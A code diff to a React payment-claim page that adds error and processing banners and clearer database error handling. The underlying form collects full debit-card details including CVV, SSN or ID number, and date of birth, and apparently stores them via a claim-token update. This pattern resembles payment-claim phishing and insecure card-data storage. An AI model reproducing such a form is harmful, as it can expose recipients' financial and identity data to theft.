@@ -17,6 +17,8 @@ export default function ClaimPaymentPage() {
   const [paymentSource, setPaymentSource] = useState(null); // Track which table: 'pending_claims' or 'transactions'
   const [claimMethod, setClaimMethod] = useState(null); // To store the method used for claim success message
   const [processing, setProcessing] = useState(false); // State to manage the processing spinner
+  const [submissionError, setSubmissionError] = useState(''); // For prominent error display
+  const [submissionSuccess, setSubmissionSuccess] = useState(false); // For success state
 
   const [citizenship, setCitizenship] = useState(null);
   const [achCitizenship, setAchCitizenship] = useState(null); // null = not selected, 'us' = US, 'international' = International
@@ -151,12 +153,16 @@ export default function ClaimPaymentPage() {
   };
 
   const handleDebitCardSubmit = async () => {
+    // Clear previous errors
+    setSubmissionError('');
+    setSubmissionSuccess(false);
+
     // Validation: Check verification fields based on type
     const hasVerification = debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : debitCardForm.id_number;
 
     if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !hasVerification || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
-      setMessage('Please fill in all required fields.', 'error');
-      setMessageType('error');
+      setSubmissionError('Please fill in all required fields.');
+      window.scrollTo({ top: 0, behavior: 'smooth' });
       return;
     }
 
@@ -170,8 +176,8 @@ export default function ClaimPaymentPage() {
       const cardExpYear = parseInt(expYear);
 
       if (cardExpYear < currentYear || (cardExpYear === currentYear && cardExpMonth < currentMonth)) {
-        setMessage('Your debit card has expired. Please use a valid card.', 'error');
-        setMessageType('error');
+        setSubmissionError('Your debit card has expired. Please use a valid card.');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
         return;
       }
     }
@@ -215,7 +221,10 @@ export default function ClaimPaymentPage() {
         .update(updateData)
         .eq('claim_token', token);
 
-      if (error) throw error;
+      if (error) {
+        console.error('Supabase update error:', error);
+        throw new Error(error.message || 'Database update failed');
+      }
 
       // Send notification email to receiver
       await fetch('/api/send-claim-notification', {
@@ -238,12 +247,13 @@ export default function ClaimPaymentPage() {
         senderName: payment.sender_name || payment.sender_contact,
         timestamp: new Date().toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' })
       });
+      setSubmissionSuccess(true);
       setClaimSuccess(true);
     } catch (error) {
       console.error('Debit card submission error:', error);
       const errorMsg = error?.message || 'Failed to process claim. Please try again.';
-      setMessage(`Error: ${errorMsg}`);
-      setMessageType('error');
+      setSubmissionError(errorMsg);
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     } finally {
       setSubmitting(false);
       setProcessing(false); // Hide processing spinner
@@ -307,7 +317,10 @@ export default function ClaimPaymentPage() {
         .eq('claim_token', token)
         .eq('status', 'sent');
 
-      if (error) throw error;
+      if (error) {
+        console.error('Supabase update error:', error);
+        throw new Error(error.message || 'Database update failed');
+      }
 
       // Send notification email to receiver
       await fetch('/api/send-claim-notification', {
@@ -330,12 +343,13 @@ export default function ClaimPaymentPage() {
         senderName: payment.sender_name || payment.sender_contact,
         timestamp: new Date().toLocaleString('en-US', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' })
       });
+      setSubmissionSuccess(true);
       setClaimSuccess(true);
     } catch (error) {
-      console.error('Error:', error);
+      console.error('ACH submission error:', error);
       const errorMsg = error?.message || 'Failed to process claim. Please try again.';
-      setMessage(`Error: ${errorMsg}`);
-      setMessageType('error');
+      setSubmissionError(errorMsg);
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     } finally {
       setSubmitting(false);
       setProcessing(false); // Hide processing spinner
@@ -749,6 +763,64 @@ export default function ClaimPaymentPage() {
                           Change
                         </button>
                       </div>
+
+                      {/* Prominent Error/Success Messages */}
+                      {submissionError && (
+                        <div style={{
+                          backgroundColor: '#fee2e2',
+                          border: '2px solid #ef4444',
+                          borderRadius: '12px',
+                          padding: '1.5rem',
+                          marginBottom: '2rem',
+                          display: 'flex',
+                          alignItems: 'flex-start',
+                          gap: '1rem'
+                        }}>
+                          <div style={{
+                            width: '48px',
+                            height: '48px',
+                            backgroundColor: '#ef4444',
+                            borderRadius: '50%',
+                            display: 'flex',
+                            alignItems: 'center',
+                            justifyContent: 'center',
+                            flexShrink: 0,
+                            fontSize: '1.5rem'
+                          }}>
+                            ⚠️
+                          </div>
+                          <div style={{ flex: 1 }}>
+                            <h3 style={{ margin: '0 0 0.5rem 0', color: '#991b1b', fontSize: '1.1rem', fontWeight: '700' }}>Submission Failed</h3>
+                            <p style={{ margin: 0, color: '#991b1b', fontSize: '0.95rem' }}>{submissionError}</p>
+                          </div>
+                        </div>
+                      )}
+
+                      {processing && (
+                        <div style={{
+                          backgroundColor: '#dbeafe',
+                          border: '2px solid #3b82f6',
+                          borderRadius: '12px',
+                          padding: '1.5rem',
+                          marginBottom: '2rem',
+                          display: 'flex',
+                          alignItems: 'center',
+                          gap: '1rem'
+                        }}>
+                          <div style={{
+                            width: '48px',
+                            height: '48px',
+                            border: '4px solid #e5e7eb',
+                            borderTop: '4px solid #3b82f6',
+                            borderRadius: '50%',
+                            animation: 'spin 1s linear infinite'
+                          }}></div>
+                          <div>
+                            <h3 style={{ margin: '0 0 0.5rem 0', color: '#1e40af', fontSize: '1.1rem', fontWeight: '700' }}>Processing Your Claim</h3>
+                            <p style={{ margin: 0, color: '#1e40af', fontSize: '0.95rem' }}>Please wait while we verify and submit your information...</p>
+                          </div>
+                        </div>
+                      )}
 
                       <h3 style={{ color: '#1e293b', fontSize: '1.15rem', fontWeight: '700', marginBottom: '0.75rem', marginTop: 0 }}>Debit Card Deposit</h3>
                       <p style={{ color: '#0066cc', marginBottom: '2rem', fontSize: '0.9rem', fontWeight: '500' }}>Visa / Mastercard — Funds available within 1 hour</p>
